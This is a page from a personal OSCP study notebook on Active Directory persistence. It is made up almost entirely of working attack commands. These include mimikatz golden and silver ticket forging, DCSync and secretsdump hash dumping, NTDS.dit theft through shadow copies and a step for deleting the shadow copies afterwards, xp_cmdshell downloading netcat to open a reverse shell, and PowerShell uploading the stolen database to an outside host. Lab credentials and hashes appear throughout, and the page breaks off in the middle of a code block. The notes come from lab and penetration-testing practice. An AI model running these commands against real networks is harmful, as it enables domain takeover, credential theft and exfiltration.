<!DOCTYPE HTML>
<html lang="en" class="light" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Persistence - Brandon&#x27;s OSCP Notes</title>


        <!-- Custom HTML head -->
        
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->

    </head>
    <body class="sidebar-visible no-js">
    <div id="body-container">
        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('light')
            html.classList.add(theme);
            var body = document.querySelector('body');
            body.classList.remove('no-js')
            body.classList.add('js');
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var body = document.querySelector('body');
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            body.classList.remove('sidebar-visible');
            body.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded "><a href="Introduction.html"><strong aria-hidden="true">1.</strong> Introduction</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> The Things</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="Quick Notes.html"><strong aria-hidden="true">2.1.</strong> Quick Notes</a></li><li class="chapter-item expanded "><a href="Scanning.html"><strong aria-hidden="true">2.2.</strong> Scanning</a></li><li class="chapter-item expanded "><a href="File Transfer.html"><strong aria-hidden="true">2.3.</strong> File Transfer</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="AddnlFileTrasnfer.html"><strong aria-hidden="true">2.3.1.</strong> Additional File Transfer</a></li></ol></li><li class="chapter-item expanded "><a href="Ports.html"><strong aria-hidden="true">2.4.</strong> Ports</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="SSHKeys.html"><strong aria-hidden="true">2.4.1.</strong> SSH Keys</a></li><li class="chapter-item expanded "><a href="sshcheatsheet.html"><strong aria-hidden="true">2.4.2.</strong> SSH Cheat Sheet</a></li></ol></li><li class="chapter-item expanded "><a href="Shells.html"><strong aria-hidden="true">2.5.</strong> Shells</a></li><li class="chapter-item expanded "><a href="Web Shells.html"><strong aria-hidden="true">2.6.</strong> Web Shells</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.</strong> Gaining Access</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="CrackMapExecCheatSheet.html"><strong aria-hidden="true">3.1.</strong> CrackMapExec Cheat Sheet</a></li><li class="chapter-item expanded "><a href="Impacket.html"><strong aria-hidden="true">3.2.</strong> Impacket</a></li><li class="chapter-item expanded "><a href="RDPEXploit.html"><strong aria-hidden="true">3.3.</strong> RDP Exploits</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.4.</strong> Password Cracking</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="My Hashcat Cheatsheet.html"><strong aria-hidden="true">3.4.1.</strong> Hashcat Cheat Sheet</a></li><li class="chapter-item expanded "><a href="My Hydra Cheatsheet.html"><strong aria-hidden="true">3.4.2.</strong> Hydra Cheat Sheet</a></li><li class="chapter-item expanded "><a href="Bruteforce.html"><strong aria-hidden="true">3.4.3.</strong> Bruteforce</a></li></ol></li><li class="chapter-item expanded "><a href="Buffer Overflow.html"><strong aria-hidden="true">3.5.</strong> Buffer Overflow</a></li><li class="chapter-item expanded "><a href="CMSs.html"><strong aria-hidden="true">3.6.</strong> CMSs</a></li><li class="chapter-item expanded "><a href="File Uploads.html"><strong aria-hidden="true">3.7.</strong> File Uploads</a></li><li class="chapter-item expanded "><a href="AddnlFileUpload.html"><strong aria-hidden="true">3.8.</strong> Additional File Upload</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="htmlfileupload.html"><strong aria-hidden="true">3.8.1.</strong> HTML</a></li><li class="chapter-item expanded "><a href="MyMacros.html"><strong aria-hidden="true">3.8.2.</strong> Macro</a></li><li class="chapter-item expanded "><a href="OLEFileUpload.html"><strong aria-hidden="true">3.8.3.</strong> OLE</a></li></ol></li><li class="chapter-item expanded "><a href="LFIRFI.html"><strong aria-hidden="true">3.9.</strong> LFI/RFI</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="LFIRFIMore.html"><strong aria-hidden="true">3.9.1.</strong> LFIRFI_More</a></li></ol></li><li class="chapter-item expanded "><a href="ShellShock.html"><strong aria-hidden="true">3.10.</strong> Shell Shock</a></li><li class="chapter-item expanded "><a href="Github.html"><strong aria-hidden="true">3.11.</strong> Github</a></li><li class="chapter-item expanded "><a href="MySQL.html"><strong aria-hidden="true">3.12.</strong> SQL</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="MoreSQL.html"><strong aria-hidden="true">3.12.1.</strong> More SQL</a></li><li class="chapter-item expanded "><a href="PSQL.html"><strong aria-hidden="true">3.12.2.</strong> PSQL</a></li><li class="chapter-item expanded "><a href="MyMySql.html"><strong aria-hidden="true">3.12.3.</strong> MySQL</a></li><li class="chapter-item expanded "><a href="MSSQL.html"><strong aria-hidden="true">3.12.4.</strong> MSSQL</a></li></ol></li><li class="chapter-item expanded "><a href="WindowLibraries.html"><strong aria-hidden="true">3.13.</strong> Windows Libraries and APIs</a></li><li class="chapter-item expanded "><a href="XXEXSSDeSerial.html"><strong aria-hidden="true">3.14.</strong> XXE_XSS_Deserialization</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="XXMore.html"><strong aria-hidden="true">3.14.1.</strong> XSS_More</a></li><li class="chapter-item expanded "><a href="XXXEMore.html"><strong aria-hidden="true">3.14.2.</strong> XXE More</a></li><li class="chapter-item expanded "><a href="CSRF.html"><strong aria-hidden="true">3.14.3.</strong> CSRF</a></li><li class="chapter-item expanded "><a href="SSRF.html"><strong aria-hidden="true">3.14.4.</strong> SSRF</a></li></ol></li><li class="chapter-item expanded "><a href="DirectoryTraveral.html"><strong aria-hidden="true">3.15.</strong> Directory Traversal</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.</strong> Linux PrivEsc</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="LinuxEnum.html"><strong aria-hidden="true">4.1.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="LinuxPrivExploit.html"><strong aria-hidden="true">4.2.</strong> Exploit</a></li><li class="chapter-item expanded "><a href="S1RENLinNotes.html"><strong aria-hidden="true">4.3.</strong> S1REN's Notes</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.</strong> Windows PrivEsc</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="WinPrivEnum.html"><strong aria-hidden="true">5.1.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="WinPrivExploit.html"><strong aria-hidden="true">5.2.</strong> Exploit</a></li><li class="chapter-item expanded "><a href="S1RENWinNotes.html"><strong aria-hidden="true">5.3.</strong> S1REN's Notes</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">6.</strong> Active Directory</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="KerberosCheetSheet.html"><strong aria-hidden="true">6.1.</strong> Kerberos Cheat Sheet</a></li><li class="chapter-item expanded "><a href="WeGotUsersbutnoPass.html"><strong aria-hidden="true">6.2.</strong> We got Users but no Pass?</a></li><li class="chapter-item expanded "><a href="ADEnum.html"><strong aria-hidden="true">6.3.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="ADAuth.html"><strong aria-hidden="true">6.4.</strong> Authentication</a></li><li class="chapter-item expanded "><a href="ADPivoting.html"><strong aria-hidden="true">6.5.</strong> Pivoting</a></li><li class="chapter-item expanded "><a href="ADLateralMovement.html"><strong aria-hidden="true">6.6.</strong> Lateral Movement</a></li><li class="chapter-item expanded "><a href="ADHashDump.html"><strong aria-hidden="true">6.7.</strong> Hash Dumping</a></li><li class="chapter-item expanded "><a href="ADPersistence.html" class="active"><strong aria-hidden="true">6.8.</strong> Persistence</a></li></ol></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <!-- Track and set sidebar scroll position -->
        <script>
            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
            sidebarScrollbox.addEventListener('click', function(e) {
                if (e.target.tagName === 'A') {
                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
                }
            }, { passive: true });
            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
            sessionStorage.removeItem('sidebar-scroll');
            if (sidebarScrollTop) {
                // preserve sidebar scroll position when navigating via links within sidebar
                sidebarScrollbox.scrollTop = sidebarScrollTop;
            } else {
                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
                var activeSection = document.querySelector('#sidebar .active');
                if (activeSection) {
                    activeSection.scrollIntoView({ block: 'center' });
                }
            }
        </script>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Brandon&#x27;s OSCP Notes</h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h2 id="persistence"><a class="header" href="#persistence">Persistence</a></h2>
<p>With krbtgt, We can create a Golden ticket.</p>
<h3 id="links"><a class="header" href="#links">Links</a></h3>
<ul>
<li><a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump">LSA Dump</a></li>
</ul>
<pre><code># Initial location of the NTDS database on the domain controller
C:\Windows\NTDS\NTDS.dit

# Step 1 → Finding a way to get the NDTS.dis and SYSTEM file
# Step 2 → Crack/Analyze offline
</code></pre>
<h3 id="golden-ticket-attack"><a class="header" href="#golden-ticket-attack">Golden Ticket Attack</a></h3>
<pre><code># Assuming that Victim account is member of Domain Admin or we have compromised the DC.
# Let's extract pass hash of krbtgt account with mimikatz.

mimikatz
privilege::debug
lsadump::lsa /patch # Look for User:krbtgt and it's NTLM Hash.

kerberos::purge
kerberos::golden /user:&lt;TOPI&gt; /domain:&lt;domain_name&gt; /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:&lt;NTLM hash&gt; /ptt
# This is allowed because DC trusts anything which is encrytped by krbtgt pass hash.

misc::cmd
psexec.exe \\dc01 cmd.exe # Lateral movement to DC.
whoami
whoami /groups
</code></pre>
<h3 id="dcsync-attack"><a class="header" href="#dcsync-attack">DCSync Attack</a></h3>
<pre><code>DSync (Domain Controller Synchronization) -&gt; Steal Pass hashes of all Admin Users in Domain.

Methods:
1) Laterally move to DC and run mimikatz to dump pass hash of every user.
2) Steal ntdis.dit from DC.
3) Above 2 requires tool upload and can get caught so we use 3rd method to abuse DC's functionality.
# Login with a Local admin priv account and run mimikatz.

mimikatz
lsadump::dcsync /user:Administrator # Administrator is target account.


impacket-secretsdump -just-dc-user krbtgt corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.205.70

</code></pre>
<p>We can request a replication update with a DC and obtain the pass hashes of every account in Active Directory without ever logging in to the domain controller.</p>
<p>Another DCSync Attack involves creating a ticket with Rubeus, like here:
<a href="https://0xdf.gitlab.io/2023/05/06/htb-flight.html#auth-as-svc_apache">HTB Flight</a></p>
<pre><code>#### Generate Ticket
.\rubeus.exe tgtdeleg /nowrap

#### Configure Kerberos Ticket
#### https://github.com/skelsec/minikerberos/tree/main

minikerberos-kirbi2ccache ticket.kirbi ticket.ccache

#### Now I’ll export the environment variable to hold that ticket:

export KRB5CCNAME=ticket.ccache

#### Time Issues
ntpdate -s flight.htb

#### Get the Hash:

secretsdump.py -k -no-pass g0.flight.htb -just-dc-user administrator
or
impacket-secretsdump -k -no-pass g0.flight.htb 


### Shell
#### Those hashes work for a pass the hash attack:


crackmapexec smb flight.htb -u administrator -H aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c

rlwrap -cAr psexec.py administrator@flight.htb -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c

</code></pre>
<h3 id="other-notes"><a class="header" href="#other-notes">Other Notes</a></h3>
<h3 id="silver-tickets"><a class="header" href="#silver-tickets">Silver Tickets</a></h3>
<pre><code>iwr -UseDefaultCredentials http://web04
privilege::debug
sekurlsa::logonpasswords

whoami /user

kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
exit


klist
iwr -UseDefaultCredentials http://web04 | findstr /i OS{
(iwr -UseDefaultCredentials http://web04).Content | findstr /i "OS{"



</code></pre>
<h3 id="another-silver-ticket-attack"><a class="header" href="#another-silver-ticket-attack">Another Silver Ticket Attack</a></h3>
<h4 id="from-vulnlab-breach"><a class="header" href="#from-vulnlab-breach">From VulnLab Breach</a></h4>
<p>https://medium.com/@persecure/breach-vulnlab-f30761f08be6</p>
<pre><code>## We can get the Domain SID from impacket’s lookupsid:

impacket-lookupsid breach.vl/svc_mssql:'Trustno1'@10.10.78.61

## We can just convert the plaintext password to NTLM on any browser-based tool.
https://codebeautify.org/ntlm-hash-generator

## And lastly, for the SPN we can retrieve it from the kerberoast attack.
GetUserSPNs.py breach.vl/Julia.Wong:Computer1

## To create the silver ticket we need to use impacket-ticketer. Remember to choose Administrator as the user.

impacket-ticketer -nthash '69596C7AA1E8DAEE17F8E78870E25A5C' -domain-sid 'S-1-5-21-2330692793-3312915120-706255856' -domain breach.vl -spn 'MSSQLSvc/breach.vl:1433' -user-id 500 Administrator


## Export the ticket.

export KRB5CCNAME=Administrator.ccache

## We can use the ticket to gain access to the mssql server..

mssqlclient.py breach.vl -k -no-pass -windows-auth

### This machine goes on to do this:

xp_cmdshell powershell -c "wget -usebasicparsing http://10.8.1.176:8888/nc64.exe -o C:\Temp\nc64.exe"

xp_cmdshell powershell -c "C:\Temp\nc64.exe -e cmd 10.8.1.176 443"

## Privesc
JuicyPotatoNG.exe -t * -p "nc64.exe" -a "-e cmd.exe 10.8.1.213 80"


</code></pre>
<h3 id="shadow-copies"><a class="header" href="#shadow-copies">Shadow Copies</a></h3>
<pre><code>*Shadow Copies*

vshadow.exe -nw -p  C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
reg.exe save hklm\system c:\system.bak
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL



powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://192.168.45.164:8000/', 'C:\ntds.dit.bak')"


powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://192.168.45.164:8000/', 'C:\system.bak')"
</code></pre>
<h3 id="copy-filesebackupprivilege"><a class="header" href="#copy-filesebackupprivilege">### Copy-FileSeBackupPrivilege</a></h3>
<p>https://github.com/giuliano108/SeBackupPrivilege</p>
<pre><code>One way to read and copy files:

upload /opt/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll
upload /opt/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
import-module .\SeBackupPrivilegeCmdLets.dll
import-module .\SeBackupPrivilegeUtils.dll
Copy-FileSeBackupPrivilege netlogon.dns \programdata\netlogon.dns
type \programdata\netlogon.dns

</code></pre>
<h3 id="diskshadow"><a class="header" href="#diskshadow">### DiskShadow</a></h3>
<pre><code>put this into a file called vss.dsh:

set context persistent nowriters 
set metadata c:\programdata\df.cab 
set verbose on 
add volume c: alias df 
create expose %df% z:


---
unix2dos vss.dsh
upload vss.dsh c:\programdata\vss.dsh
diskshadow /s c:\programdata\vss.dsh

smbserver.py s . -smb2support -username df -password df
net use \\10.10.14.14\s /u:df df
Copy-FileSeBackupPrivilege z:\Windows\ntds\ntds.dit \\10.10.14.14\s\ntds.dit
reg.exe save hklm\system \\10.10.14.14\system
secretsdump.py -system system -ntds ntds.dit LOCAL

</code></pre>
<h3 id="ticket-generation-from-linux"><a class="header" href="#ticket-generation-from-linux">Ticket generation from Linux</a></h3>
<pre><code># Generate a ticket or convert it (kekeo) to ccache format
ticketer.py -nthash &lt;hash&gt; -domain-sid &lt;sid&gt; -domain &lt;domain&gt; &lt;user&gt;

# Export the path in the right variable
export KRB5CCNAME=/tmp/ticket.ccache
klist

# Exec and use the ticket
/impacket/examples/psexec.py -k -n -debug DOMAIN/user@host

# Dump NTDS
proxychains secretsdump.py -k -no-pass qsec@DCFIL.PRAMAFIL.CORP -use-vss

</code></pre>
<h3 id="golden-ticket"><a class="header" href="#golden-ticket">Golden Ticket</a></h3>
<pre><code># Golden Ticket
&gt; Nom du compte administrateur (Administrateur)
&gt; Nom complet du domaine (domain.local)
&gt; SID du domaine (S-1-5-21-1723555596-1415287819-2705645101) [whoami /user]
&gt; Hash NTLM du compte krbtgt (6194bd1a5bf3ecd542e8aac9860bddf0)

mimikatz # privilege:debug
mimikatz # lsadump::lsa /inject /name:krbtgt

mimikatz # kerberos::golden /admin:Administrateur /domain:domain.local /sid:S-1-5-21-1723555596-1415287819-2705645101 /krbtgt:6194bd1a5bf3ecd542e8aac9860bddf0 /ticket:domain.local.kirbi /id:500 /ptt

Use :
mimikatz # kerberos::ptt domain.local.kirbi
mimikatz # kerberos::list



# Resource
https://twitter.com/mpgn_x64/status/1241688547037532161

# Golden ticket and access denied ?
# from cmd (elevated)
&gt; mimikatz kerberos::golden
&gt; klist add_bind &lt;DOMAIN&gt; &lt;DC&gt;
&gt; psexec \\dc\ cmd


</code></pre>
<h3 id="playing-with-tickets-on-windows"><a class="header" href="#playing-with-tickets-on-windows">Playing with tickets on Windows</a></h3>
<pre><code># Sessions en cours
mimikatz # sekurlsa::logonpasswords

# Ticket TGT
# Dump SPN
PS C:\&gt; Find-PSServiceAccounts -DumpSPN
Discovering service account SPNs in the AD Domain foo.local
svcSQLServ/pc1.foo.local:1433

# Download Mimikatz
PS C:\&gt; Invoke-Expression (New-Object Net.Webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
PS C:\&gt; Invoke-Mimikatz
mimikatz(powershell) # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)

# Lister les tickets actifs ou les purger
PS C:\&gt; Invoke-Mimikatz -Command '"kerberos::purge"'
PS C:\&gt; Invoke-Mimikatz -Command '"kerberos::list"'
PS C:\&gt; klist

# Demander un ticket
PS C:\&gt; Add-Type -AssemblyName System.IdentityModel
PS C:\&gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "svcSQLServ/pc1.foo.local:1433"

# Exporter un ticket
mimikatz # kerberos::list /export

# Crack Ticket
python tgsrepcrack.py wordlist.txt ticket.kirbi

</code></pre>
<h3 id="local-extraction"><a class="header" href="#local-extraction">Local Extraction</a></h3>
<h5 id="vssadmin"><a class="header" href="#vssadmin">VSSadmin</a></h5>
<pre><code># Récupération via VSSadmin
# Create a Volume Shadow Copy
C:\Windows\system32&gt; vssadmin create shadow /for=C:

# Retrieve NTDS from the copy
C:\Windows\system32&gt; copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit c:\Extract\ntds.dit

# Copy SYSTEM file
C:\Windows\system32&gt; reg SAVE HKLM\SYSTEM c:\Extract\SYS
C:\Windows\system32&gt; copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM c:\Extract\SYSTEM

# Delete tracks
C:\Windows\system32&gt; vssadmin delete shadows /shadow={uuid}

# Trick if you are on a semi-interactive shell
# You can specify /quiet option to not get the prompt
# Can be usefull for deletion (as it require to confirm)
vssadmin delete shadows /shadow={uuid} /quiet

</code></pre>
<h5 id="ntdsutil-tool"><a class="header" href="#ntdsutil-tool">ntdsutil tool</a></h5>
<pre><code># ntdsutil is a builtin tool used to manage the AD
# You can abuse it and create a backup of the ntds.dit file
ntdsutil
activate instance ntds
ifm
create full C:\ntdsutil
quit
quit

</code></pre>
<h5 id="dc-sync--mimikatz"><a class="header" href="#dc-sync--mimikatz">DC Sync / Mimikatz</a></h5>
<pre><code># DC Sync is a less noisy way to extract users informations
# It uses the DRS (Directory Replication Service)

# Classic
mimikatz # lsadump::dcsync /domain:domain.lan /all /csv

# Specific user
mimikatz # lsadump::dcsync /domain:domain.lan /user:test

</code></pre>
<h5 id="powersploit"><a class="header" href="#powersploit">PowerSploit</a></h5>
<pre><code># PowerSploit contains a script using the volume shadow copy service
Import-Module .\VolumeShadowCopyTools.ps1
New-VolumeShadowCopy -Volume C:\
Get-VolumeShadowCopy 

# Also possible through a meterpreter session
powershell_shell
New-VolumeShadowCopy -Volume C:\
Get-VOlumeShadowCopy

</code></pre>
<h5 id="invoke-dcsync"><a class="header" href="#invoke-dcsync">Invoke-DCSync</a></h5>
<pre><code># Powershell script
# Leverages PowerView, Invoke-ReflectivePEInjection and a DLL wrapper of PowerKatz
Invoke-DCSync

# Get other format (user:id:lm:ntlm)
Invoke-DCSync -PWDumpFormat

# It is also possible through a meterpreter session

</code></pre>
<h5 id="nishang"><a class="header" href="#nishang">Nishang</a></h5>
<pre><code># Nishang is a post exploitation framework allowing attacker to perform attacks
# You can use the Copy-VSS script to get NTDS.dit, SAM and SYSTEM files
Import-Module .\Copy-VSS.ps1
Copy-VSS
Copy-VSS -DestinationDir C:\ShadowCopy\

# You can also use them throught a meterpretrer session by loading the powershell extension
load powershell
powershell_import /root/Copy-VSS.ps1
powershell_execute Copy-VSS

# Also possible to establish a direct connection
powershell_shell
PS &gt; Copy-VSS
PS &gt; Copy-VSS -DestinationDir C:\Ninja

</code></pre>
<h3 id="remote-extraction"><a class="header" href="#remote-extraction">Remote Extraction</a></h3>
<h5 id="crackmapexec"><a class="header" href="#crackmapexec">CrackMapExec</a></h5>
<pre><code>crackmapexec xxx.xxx.xxx.xxx -u login -p password -d domain --ntds drsuapi
</code></pre>
<h5 id="wmi---remote"><a class="header" href="#wmi---remote">WMI - Remote</a></h5>
<pre><code># It is possible to remotely extract the NTDS database using WMI and VSSADMIN
wmic /node:dc /user:PENTESTLAB\David /password:pentestlab123!! process call create "cmd /c vssadmin create shadow /for=C: 2&gt;&amp;1"
wmic /node:dc /user:PENTESTLAB\David /password:pentestlab123!! process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit 2&gt;&amp;1"
wmic /node:dc /user:PENTESTLAB\David /password:pentestlab123!! process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM\ C:\temp\SYSTEM.hive 2&gt;&amp;1"

</code></pre>
<h4 id="impacket"><a class="header" href="#impacket">Impacket</a></h4>
<pre><code>
python secretsdump.py -history -user-status -just-dc-user Administrateur -just-dc-ntlm foo.local/administrateur:P4ssw0rd\!@DC1.FOO.LOCAL

python secretsdump.py -history -user-status -just-dc-user krbtgt -just-dc-ntlm foo.local/administrateur:P4ssw0rd\!@DC1.FOO.LOCAL



</code></pre>
<h5 id="ntds-extraction-and-analysis"><a class="header" href="#ntds-extraction-and-analysis">NTDS Extraction and analysis</a></h5>
<pre><code># Impacket provides a usefull script to do that (decrypt copied files)
impacket-secretsdump -system /root/SYSTEM -ntds /root/ntds.dit DOMAIN

# Also possible to dump it remotely by using the computer account and its hash
impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\$@10.0.0.1

# Extraction is also possible using NTDSDumpEx
NTDSDumpEx.exe -d ntds.dit -s SYSTEM.hive

# Or adXtract
./adXtract.sh /root/ntds.dit /root/SYSTEM pentestlab

</code></pre>
<h5 id="empire"><a class="header" href="#empire">Empire</a></h5>
<pre><code># Empire has 2 modules you can use to retrieve hashes through DCSync
usemodule credentials/mimikatz/dcsync_hashdump
usemodule credentials/mimikatz/dcsync

</code></pre>
<h3 id="resource-based-constrained-delegation"><a class="header" href="#resource-based-constrained-delegation">Resource Based Constrained Delegation</a></h3>
<p>Let's use our access with the <code>l.livingstone</code> account to create a new machine account on the domain. We can do with by using <code>impacket-addcomputer</code>.</p>
<pre><code>┌──(kali㉿kali)-[~]
└─$ impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.120.181 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Successfully added machine account ATTACK$ with password AttackerPC1!.
</code></pre>
<p>Another Example of this:</p>
<pre><code>addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host 
$DomainController -domain-netbios $DOMAIN 'domain/user:password'

python3 addcomputer.py -computer-name 'evilcom$' -computer-pass password -dc-ip 10.10.11.174 support/support:Ironside47pleasure40Watchful
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[!] No DC host set and 'support' doesn't look like a FQDN. DNS resolution of short names will probably fail.
[*] Successfully added machine account evilcom$ with password password.
</code></pre>
<p>We can verify that this machine account was added to the domain by using our <code>evil-winrm</code> session from before.</p>
<pre><code>*Evil-WinRM* PS C:\Users\L.Livingstone\Documents&gt; get-adcomputer attack


DistinguishedName : CN=ATTACK,CN=Computers,DC=resourced,DC=local
DNSHostName       :
Enabled           : True
Name              : ATTACK
ObjectClass       : computer
ObjectGUID        : 3fe60405-3692-4de9-8a20-917b234741b9
SamAccountName    : ATTACK$
SID               : S-1-5-21-537427935-490066102-1511301751-3601
UserPrincipalName :
</code></pre>
<p>With this account added, we now need a python script to help us manage the delegation rights. Let's grab a copy of <a href="https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py">rbcd.py</a> and use it to set <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> on our new machine account.</p>
<pre><code>┌──(kali㉿kali)-[~]
